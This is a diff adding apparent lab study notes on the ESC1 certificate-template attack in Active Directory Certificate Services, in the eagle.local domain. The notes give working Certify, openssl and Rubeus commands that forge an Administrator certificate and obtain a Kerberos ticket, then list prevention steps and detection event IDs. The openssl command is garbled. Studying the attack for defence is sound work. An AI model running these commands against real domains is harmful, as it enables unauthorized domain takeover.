@@ -1,0 +1,77 @@
+Description:
+
+  - Advantages of using certificates and compromising the Certificate Authority (CA):
+
+    - Users and machines certificates are valid for 1+ years
+
+    - Resetting a user password does not invalidate the certificate. With certificates, 
+    it doesn't matter how many times a user changes their password; the certificate will
+    still be valid (unless expired or revoked).
+
+    - Misconfigured templates allow for obtaining a certificate for any user
+
+    - Compromising the CA's private key results in forging Golden Certificates
+
+  - These advantages make certificates the preferred method for long-term persistence.
+
+  - ESC1:
+
+    - Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart
+    Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+
+
+Attacks:
+
+  - Utilize Certify https://github.com/GhostPack/Certify, to scan the environment for vulnerabilities 
+  PKI infrastructure.
+
+    .\Certify.exe find /vulnerable
+
+  - We see the UserCert template is vulnerable
+
+    .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
+
+  - This will give us a PEM certificate that displays as base64 which needs to converted to PFX format
+
+  - First run
+
+    sed -i 's/\s\s\+/\n/g' cert.pem
+
+  - Then run
+
+    openssl pkcs -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export
+
+  - Rubeus supports PFX so now we can request a kerberos TGT for the account Administrator and authenticate with the certificate
+
+    .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
+
+  - Can now list the contents of the C$ share on DC1
+
+    dir \\dc1\c$
+
+
+Prevention:
+
+  - Attack would not be possible of the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is not enabled in the 
+  certificate template. 
+
+  - Require CA certificate manager approval before issuing certificates, this will ensure that no certificates
+  on potentially dangerous templates are issued without manual approval
+
+  - Rgularly scan with Certify to find potential PKI issues
+
+
+Detection:
+
+  - When CA generates the cert. Event ID 4886 and 4887 will generate
+
+  - Can use the certutil -view to dump everything on the CA with all the info about each certificate
+
+  - Also will generate Event ID 4768
+
+
+
+
+
+
+
